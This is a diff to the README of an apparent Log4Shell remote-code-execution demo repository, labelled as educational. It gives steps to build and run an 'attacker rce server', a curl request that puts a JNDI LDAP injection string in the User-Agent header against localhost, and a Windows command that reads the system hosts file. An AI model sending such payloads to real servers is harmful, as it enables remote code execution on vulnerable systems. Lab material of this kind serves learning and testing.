@@ -1,10 +1,9 @@
 # log4Shell
 log4Shell vulnerability RCE sample
 
----
 **NOTE**
 
-This repo is only for learning purposes
+This repo is only for educational purposes only
 
 ---
 
@@ -30,11 +29,17 @@ java -jar build\libs\payload-1.0.0.jar
 ## Run attacker rce server (rce)
 ```
 gradlew build
+java -jar build\libs\rce-1.0.0.jar
 
 ```
 
 ## Do the attacker
 ```
 curl http://localhost:8080/ -H 'User-Agent:${jndi:ldap://0.0.0.0:636/a}'
+```
+
+## Sample command on windows
+```
+cmd /C more c:\windows\system32\drivers\etc\hosts
 ```
 
